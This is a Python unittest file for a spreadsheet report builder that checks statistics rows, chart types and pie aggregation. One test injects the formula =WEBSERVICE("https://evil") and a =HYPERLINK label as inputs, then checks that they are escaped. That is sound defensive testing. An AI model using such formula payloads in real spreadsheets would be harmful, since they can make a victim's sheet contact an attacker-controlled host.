"""CREAM GridCraft report: report truthfulness, chart data, and Athena isolation."""
import unittest
from fastapi import HTTPException
from gridcraft_adapter import (
    CreamReportRequest, CreamReportMetric, CreamReportPoint, build_cream_report,
    _safe_spreadsheet_label,
)


def report(**overrides):
    kwargs = {
        "source": "sample.csv",
        "rowCount": 60,
        "metrics": [CreamReportMetric(
            key="營收", n=60, missing=0, sum=1830, mean=30.5,
            median=30.5, min=1, max=60, sampleStdDev=17.46,
        )],
        "focusKey": "營收",
        "points": [
            CreamReportPoint(row=i + 2, label=f"{i+1}月", value=float(i+1))
            for i in range(48)
        ],
        "chartKind": "line",
    }
    kwargs.update(overrides)
    return CreamReportRequest(**kwargs)


class CreamGridCraftTests(unittest.TestCase):
    def test_full_statistics_not_mislabeled_as_chart_48_points(self):
        cmd, chart = build_cream_report(report())
        self.assertEqual(chart, "line")
        self.assertEqual(cmd[0]["command"], "range.setValues")
        rows = cmd[0]["params"]["values"]
        self.assertEqual(rows[2], ["原始資料筆數", 60])
        self.assertEqual(rows[6][1], 60)
        self.assertEqual(rows[6][3], 1830)
        self.assertTrue(any("48" in str(v) for row in rows for v in row))
        self.assertEqual(cmd[-1]["command"], "insert.chart")
        self.assertEqual(cmd[-1]["params"]["type"], "line")
        formula_rows = [row for row in rows if len(row) > 1 and isinstance(row[1], str) and row[1].startswith("=")]
        self.assertEqual(len(formula_rows), 2)
        self.assertTrue(formula_rows[0][1].startswith("=SUM("))

    def test_source_labels_never_executed_as_spreadsheet_formulas(self):
        payload = report(
            source="=WEBSERVICE(\"https://evil\")",
            points=[CreamReportPoint(row=2, label="=HYPERLINK(A1)", value=4)],
        )
        commands, _ = build_cream_report(payload)
        values = commands[0]["params"]["values"]
        self.assertTrue(values[1][1].startswith("'=WEBSERVICE"))
        self.assertTrue(any(row[0] == "'=HYPERLINK(A1)" for row in values))

    def test_negative_pie_rejected_as_native_chart_not_falsely_recast(self):
        data = report(rowCount=2, metrics=[CreamReportMetric(
            key="營收", n=2, missing=0, sum=2, mean=1, median=1, min=-3, max=5, sampleStdDev=5.65,
        )], points=[
            CreamReportPoint(row=2, label="甲", value=-3),
            CreamReportPoint(row=4, label="乙", value=5),
        ], chartKind="pie")
        commands, chart = build_cream_report(data)
        self.assertIsNone(chart)
        self.assertNotIn("insert.chart", [x["command"] for x in commands])

    def test_repeated_pie_labels_are_aggregated_for_native_chart(self):
        data = report(rowCount=3, metrics=[CreamReportMetric(
            key="營收", n=3, missing=0, sum=60, mean=20, median=20, min=10, max=30, sampleStdDev=10,
        )], points=[
            CreamReportPoint(row=2,label="A",value=10),
            CreamReportPoint(row=3,label="B",value=20),
            CreamReportPoint(row=4,label="A",value=30),
        ], chartKind="pie")
        commands, chart = build_cream_report(data)
        self.assertEqual(chart, "pie")
        rows = commands[0]["params"]["values"]
        self.assertTrue(any(row[0]=="A" and row[1]==40 for row in rows))
        self.assertTrue(any(row[0]=="B" and row[1]==20 for row in rows))

    def test_empty_metric_fake_focus_and_count_mismatch_are_rejected(self):
        for patch in [
            {"focusKey":"不存在"},
            {"metrics":[CreamReportMetric(key="營收",n=20,missing=0,sum=20,mean=1,median=1,min=1,max=1)]},
        ]:
            with self.subTest(patch=patch), self.assertRaises(HTTPException):
                build_cream_report(report(**patch))

    def test_retain_real_source_row_after_empty_csv_lines(self):
        data=report(rowCount=2,metrics=[CreamReportMetric(
            key="營收",n=2,missing=0,sum=30,mean=15,median=15,min=10,max=20,sampleStdDev=7.071,
        )],points=[CreamReportPoint(row=2,label="一月",value=10),CreamReportPoint(row=4,label="二月",value=20)])
        commands,_=build_cream_report(data)
        self.assertTrue(any(row[2]==4 for row in commands[0]["params"]["values"] if len(row)>=3))


if __name__ == "__main__":
    unittest.main()
